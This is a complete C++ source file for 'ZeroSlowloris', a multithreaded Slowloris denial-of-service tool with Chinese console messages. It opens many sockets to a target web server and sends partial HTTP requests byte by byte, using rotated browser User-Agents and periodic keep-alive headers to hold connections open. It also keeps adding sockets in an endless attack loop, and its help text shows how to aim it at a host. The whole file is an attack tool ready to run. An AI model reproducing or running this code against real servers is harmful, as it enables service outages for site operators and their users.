/*Bagian Include*/
#include <iostream>
#include <vector>
#include <mutex>
#include <ctime>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/fcntl.h>
#include <netinet/tcp.h>
#include <thread>
#include <string>
#include <netdb.h>
#include <cstring>
#include <csignal>
#include <iomanip>

using namespace std;
class ZeroSlowloris
{
  public:
    /*Variables*/
    vector<string> user_agents = {
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"};

    vector<int> socket_connections;
    //int running_connections;
    int closed_connections = 0;
    int total_requests_sent = 0;

    string targetIP;
    string host;
    int port;
    int threads;
    int max_sockets;
    int given_socks;
    
    int min_delay;
    int max_delay;

    int delay_print_details;
    int delay_keep_alive;
    //Constructer
    ZeroSlowloris(string target_IP, int port, int num_sockets, int threads, int min_delay, int max_delay, int delay_keep_alive, int delay_print_details, string host)
    {
        this->targetIP = target_IP;
        this->host = host;
        this->port = port;
        this->threads = threads;
        this->max_sockets = num_sockets;
        this->given_socks = num_sockets;
        
        this->min_delay = min_delay;
        this->max_delay = max_delay;

        this->delay_keep_alive = delay_keep_alive;
        this->delay_print_details = delay_print_details;
    };
    /*Methods*/
    
    void socketInitialization(string IP, int port);
    void sendKeepAliveHeaders(int socket_index);

    void createSockets(int socks, int threads);
    void sendKeepAlive();
    void startAttack();
    void showDetails(std::chrono::high_resolution_clock::time_point start_time);

    mutex locker;
};

int random_number(int min, int max)
{
    // Generate a random number between min and max
    srand(time(NULL));
    return min + rand() % (max - min + 1);
}

int setKeepAlive(int sockfd, int keepalive, int keepidle, int keepintvl, int keepcnt)
{
    int optval = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    return 0;
}

void ZeroSlowloris::socketInitialization(string IP, int port)
{
    // Create a socket
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == -1)
    {
        // perror("socket");
        close(socket_fd);
        return;
    }
    
    // Connect to the server
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, IP.c_str(), &(addr.sin_addr)) <= 0)
    {
        perror("inet_pton");
        close(socket_fd);
        return;
    }
    
    if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("connect");
        close(socket_fd);
        // return;
    }
    else
    {
        // Send the HTTP request
        string request = "GET /?";
        request += to_string(random_number(1, 10000)) + " HTTP/1.1\r\n";
        request += "Host: " + host + "\r\n";
        try
        {
            if (!user_agents.empty())
            {
                size_t index = random_number(0, user_agents.size());
                if (index < user_agents.size())
                {
                    string ua = user_agents[index];
                    request += "User-Agent: " + ua + "\r\n";
                }
            }
        }
        catch (...)
        {
        }
        request += "Accept-Language: en-US,en;q=0.5\r\n";
        request += "Connection: keep-alive";

        // Initialize the bytes sent variable
        size_t bytes_sent = 0;

        // Append the socket to the vector array
        locker.lock();
        total_requests_sent++;
        socket_connections.push_back(socket_fd);
        locker.unlock();

        // Send the request slowly
        for (size_t i = 0; i < request.length(); i++)
        {
            try
            {
                if (send(socket_fd, &request[i], 1, 0) == -1)
                {
                    // The character was not sent successfully
                    // Remove the socket from the vector array
                    locker.lock();
                    try
                    {
                        close(socket_connections[socket_fd]);
                    }
                    catch (...)
                    {
                    }
                    //cout<<"closed socket=-1 req";
                    socket_connections.erase(socket_connections.begin() + socket_fd);
                    socket_connections.shrink_to_fit();
                    closed_connections++;
                    locker.unlock();
                    break;
                }
            }
            catch (...)
            {
                // The character was not sent successfully
                // Remove the socket from the vector array
                locker.lock();
                try
                {
                    close(socket_connections[socket_fd]);
                }
                catch (...)
                {
                }
                //cout<<"closed socket=-1 req";
                socket_connections.erase(socket_connections.begin() + socket_fd);
                socket_connections.shrink_to_fit();
                closed_connections++;
                locker.unlock();
                break;
            }

            // Increment the bytes sent variable
            bytes_sent++;
            // Sleep for a random amount of time between min_delay and max_delay milliseconds
            if (max_delay != 0)
            {
                usleep(random_number(min_delay, max_delay));
            }
        }
    }
}

void ZeroSlowloris::sendKeepAliveHeaders(int socket_index)
{
    // Generate a random number between1 and5000
    string random_number_string = to_string(random_number(1, 5000));

    // Combine the `"X-a: "` header with the random number
    string header = "\r\nX-a: " + random_number_string;

    // Initialize the bytes sent variable
    size_t bytes_sent = 0;

    // Send the header to the server slowly
    for (size_t i = 0; i < header.length(); i++)
    {
        try
        {
            if (send(socket_connections[socket_index], &header[i], 1, 0) == -1)
            {
                // The character was not sent successfully
                // Remove the socket from the vector array
                locker.lock();
                try
                {
                    close(socket_connections[socket_index]);
                }
                catch (...)
                {
                }
                //cout<<"closed socket=-1 head";
                socket_connections.erase(socket_connections.begin() + socket_index);
                socket_connections.shrink_to_fit();
                closed_connections++;
                locker.unlock();
                break;
            }
        }
        catch (...)
        {
            // The character was not sent successfully
            // Remove the socket from the vector array
            locker.lock();
            try
            {
                close(socket_connections[socket_index]);
            }
            catch (...)
            {
            }
            //cout<<"closed socket=-1 head";
            socket_connections.erase(socket_connections.begin() + socket_index);
            socket_connections.shrink_to_fit();
            closed_connections++;
            locker.unlock();
            break;
        }

        // Increment the bytes sent variable
        bytes_sent++;
        //cout<<bytes_sent<<"\r\n";
        // Sleep for a random amount of time
        if (max_delay != 0)
        {
            usleep(random_number(min_delay, max_delay));
        }
    }
}

void ZeroSlowloris::createSockets(int socks, int threads)
{
    std::vector<std::thread> threads_array;
    int counter = 0;

    while (counter < socks)
    {
        int sockets_per_thread = socks - counter < threads ? socks - counter : threads;
        // Create a thread for each iteration
        for (int i = 0; i < sockets_per_thread; i++)
        {
            threads_array.push_back(std::thread([this] {
                // Create a socket
                socketInitialization(targetIP, port);
            }));
            counter++;
        }

        // Join the threads
        for (auto &thread : threads_array)
        {
            thread.join();
        }

        threads_array.clear();
    }
}
/*
void ZeroSlowloris::createSockets(int socks, int threads) {
    if (socks > threads) {
        // Create a thread pool
        vector < thread > threads_array;
        // Start the threads
        for (int i = 0; i < threads; i++) {
            threads_array.push_back(std::thread([this, socks, threads] {
                // Create sockets
                for (int i = 0; i < socks / threads; i++) {
                    // Create a socket
                    socketInitialization(targetIP, port);
                }
            }));
        }
        //cout<<threads_array.size();
        // Join the threads
        for (auto &thread: threads_array) {
            thread.join();
        }
    }
    else
    {
        if (socks > 10) {
            // Set lower number of threads
            int threads = socks - 5;
            createSockets(socks, threads);
        }
        else
        {
            for (int i = 0; i < socks; i++) {
                // Create a socket
                socketInitialization(targetIP, port);
            }
        }
    }
}
*/

void ZeroSlowloris::sendKeepAlive()
{
    // Create a thread pool
    vector<thread> threads_array;

    // Start the threads
    for (int i = 0; i < threads; i++)
    {
        threads_array.push_back(std::thread([this, i] {
            // Send keep-alive headers
            for (int j = i; j < socket_connections.size(); j += threads)
            {
                sendKeepAliveHeaders(socket_connections[j]);
                //cout << "Soc(" << j << ")" << endl;
            }
        }));
    }

    // Join the threads
    for (auto &thread : threads_array)
    {
        thread.join();
    }
}

void ZeroSlowloris::showDetails(std::chrono::high_resolution_clock::time_point start_time)
{
    // Measure the elapsed time in seconds with a precision of 0.000
    auto now = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed_seconds = now - start_time;
    
    static bool msg_print = false;
    
    if (given_socks == socket_connections.size() && !msg_print)
    {
        std::cout << "\n[+]创建 " << max_sockets << " 个套接字所需时间: "
                  << std::fixed << std::setprecision(4) << elapsed_seconds.count() << " 秒\n\n";
        msg_print = true;
    }

    // 打印活跃连接数和已关闭连接数以及经过的时间
    std::cout << "[+]活跃套接字: " << socket_connections.size()
              << "   [+]已关闭套接字: " << closed_connections << " [+]已过时间: " << std::fixed << std::setprecision(4) << elapsed_seconds.count() << " 秒\r";
    std::cout.flush();
    /*
    if (elapsed_seconds.count() > 300)
    {
        std::cout << "\n\n[+]ZeroSlowloris的演示版本已达到时间限制。退出程序。\n";
        exit(0);
    }*/
}

void ZeroSlowloris::startAttack()
{
    while (true)
    {
        int socks_to_create = max_sockets - socket_connections.size();
        if (socks_to_create < 20)
        {
            socks_to_create += 150;
            max_sockets += 150;
        }
        if (socks_to_create > 0)
        {
            cout << "\033[F"; // 光标向上移动一行
            cout << "[+]正在创建: " << socks_to_create << " 个套接字\n";
            createSockets(socks_to_create, threads);
        }

        sleep(delay_keep_alive);
        cout << "\033[F"; // 光标向上移动一行
        cout << "正在发送保持活动头部\n";
        sendKeepAlive();
    }
}

void printHelp()
{
    std::cout << "使用方法: ./ocdos 目标地址 端口 最大连接数 线程数 [选项]\n"
              << "示例: ./ocdos www example.com 80 1000 15\n"
              << " \n"
              << "选项:\n"
              << "  -h, --help            显示帮助信息并退出\n"
              << "\n输入信息:\n"
              << "  目标地址       : 目标IP地址或主机名\n"
              << "  端口          : 目标端口号\n"
              << "  最大连接数     : 要打开的最大套接字数\n"
              << "  线程数        : 要使用的线程数\n"
              << "  最小延迟     : [可选] 每个字符之间的最小延迟时间（默认：禁用）\n"
              << "  最大延迟     : [可选] 每个字符之间的最大延迟时间（默认：禁用）\n"
              << "  延迟保持活动 : [可选] 发送Keep-Alive头部之间的延迟时间（默认：1秒）\n"
              << "  延迟打印详情 : [可选] 打印攻击详情的延迟时间（默认：100毫秒）\n"
              << "\n作者: 夜丽\n";
}

string resolveIPAddress(const string &domain)
{
    struct addrinfo hints,
        *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;

    if (getaddrinfo(domain.c_str(), nullptr, &hints, &res) != 0)
    {
        std::cerr << "解析 " << domain << " 的IP地址失败" << std::endl;
        return "";
    }

    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(addr->sin_addr), ip, INET_ADDRSTRLEN);

    freeaddrinfo(res);

    return std::string(ip);
}

bool isIPAddress(const std::string &ipAddress)
{
    struct sockaddr_in sa;
    return (inet_pton(AF_INET, ipAddress.c_str(), &(sa.sin_addr)) != 0);
}

int main(int argc, char *argv[])
{
    // Ignore SIGPIPE signal
    signal(SIGPIPE, SIG_IGN);
    
    std::string target = "127.0.0.1";
    int port = 8000;
    int max_socks = 21;
    int threads = 6;
    int min_delay = 0 * 1000;
    int max_delay = 0 * 1000;
    int delay_keep_alive = 5;
    int delay_print_details = 100000;

    // Check if the number of arguments is sufficient
    if (argc < 5)
    {
        std::cout << "参数不足。\n";
        printHelp();
        return 1;
    }

    // Parse the necessary arguments
    target = argv[1];
    port = std::stoi(argv[2]);
    max_socks = std::stoi(argv[3]);
    threads = std::stoi(argv[4]);

    // Parse the optional arguments if provided
    if (argc > 5)
    {
        min_delay = std::stoi(argv[5]) * 1000;
    }
    if (argc > 6)
    {
        max_delay = std::stoi(argv[6]) * 1000;
    }
    if (argc > 7)
    {
        delay_keep_alive = std::stoi(argv[7]);
    }
    if (argc > 8)
    {
        delay_print_details = std::stoi(argv[8]);
    }
    //cout<<"This is demo/free version of ZeroSlowloris// So wait 60sec:)\n";
    //sleep(60);
    std::string ipAddress = target;
    if (!isIPAddress(target))
    {
        ipAddress = resolveIPAddress(target);
        if (ipAddress.empty())
        {
            std::cerr << "给定域名的IP解析失败" << std::endl;
            return 1;
        }
        std::cout << "为 " << target << " 解析到的IP地址: " << ipAddress << std::endl;
    }

    ZeroSlowloris Slowloris(ipAddress, port, max_socks, threads, min_delay, max_delay, delay_keep_alive, delay_print_details, target);


    std::chrono::high_resolution_clock::time_point start_time = std::chrono::high_resolution_clock::now();

    // 创建一个线程来运行showDetails()方法
    std::thread showDetailsThread([&Slowloris, delay_print_details, start_time] {
        std::cout << '\n';
        while (true)
        {
            Slowloris.showDetails(start_time);
            usleep(delay_print_details);
        }
    });

    // Start the attack
    cout<<endl;
    Slowloris.startAttack();

    //Slowloris.showDetails(std::chrono::high_resolution_clock::time_point start_time);
    // Join the showDetailsThread
    showDetailsThread.join();
    return 0;
}
